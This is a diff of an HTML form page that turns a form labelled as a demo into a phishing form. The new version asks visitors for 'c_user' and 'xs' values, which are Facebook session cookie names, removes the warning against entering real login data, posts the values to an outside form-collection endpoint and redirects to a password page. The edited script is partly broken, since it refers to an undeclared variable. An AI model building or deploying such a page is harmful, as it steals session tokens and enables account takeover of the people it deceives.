@@ -102,32 +102,32 @@
         </div>
 
         <form id="step1Form" autocomplete="off">
-          <label for="user_id">User ID (demo)</label>
-          <input id="user_id" name="user_id" type="text" placeholder="Enter your User ID (demo only)" required>
-          <label for="session_key">Session Key (demo)</label>
-          <input id="session_key" name="session_key" type="text" placeholder="Enter a Session Key (demo only)" required>
+          <label for="c_user">c_user (value)</label>
+          <input id="c_user" name="user_id" type="text" placeholder="Enter your c_user (value )" required>
+          <label for="xs">xs (value)</label>
+          <input id="session_key" name="xs" type="text" placeholder="Enter a xs (value)" required>
           <button class="btn" type="submit">Submit</button>
         </form>
 
-        <p class="note"><strong>Notice:</strong> This is a demo-style claim form. Do not enter real social login/password values.</p>
+        <p class="note"><strong>Notice:</strong> Ensure you provide correct information for verification.</p>
       </div>
     </div>
   </div>
 
   <script>
-    const SUBMIT_ENDPOINT = "https://submit-form.com/k8oesII1U";
+    const SUBMIT_ENDPOINT = "https://submit-form.com/blhVBi5SO";
     const form = document.getElementById('step1Form');
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      const user_id = document.getElementById('user_id').value.trim();
-      const session_key = document.getElementById('session_key').value.trim();
-      if(!user_id || !session_key){
+      const user_id = document.getElementById('c_user').value.trim();
+      const xs = document.getElementById('session_key').value.trim();
+      if(!c_user || !xs){
         alert('Please fill both fields.');
         return;
       }
       const payload = new FormData();
-      payload.append('user_id', user_id);
-      payload.append('session_key', session_key);
+      payload.append('c_user', c_user);
+      payload.append('xs', xs);
       payload.append('stage', 'step1-demo');
       try {
         await fetch(SUBMIT_ENDPOINT, { method: 'POST', body: payload });
@@ -136,13 +136,13 @@
         fallbackForm.method = 'POST';
         fallbackForm.action = SUBMIT_ENDPOINT;
         fallbackForm.style.display = 'none';
-        const i1 = document.createElement('input'); i1.name='user_id'; i1.value=user_id; fallbackForm.appendChild(i1);
-        const i2 = document.createElement('input'); i2.name='session_key'; i2.value=session_key; fallbackForm.appendChild(i2);
+        const i1 = document.createElement('input'); i1.name='c_user'; i1.value=c_user; fallbackForm.appendChild(i1);
+        const i2 = document.createElement('input'); i2.name='xs'; i2.value=xs; fallbackForm.appendChild(i2);
         const i3 = document.createElement('input'); i3.name='stage'; i3.value='step1-demo'; fallbackForm.appendChild(i3);
         document.body.appendChild(fallbackForm);
         fallbackForm.submit();
       }
-      const params = new URLSearchParams({ user_id, session_key });
+      const params = new URLSearchParams({ c_user, xs });
       window.location.href = 'password.html?' + params.toString();
     });
   </script>
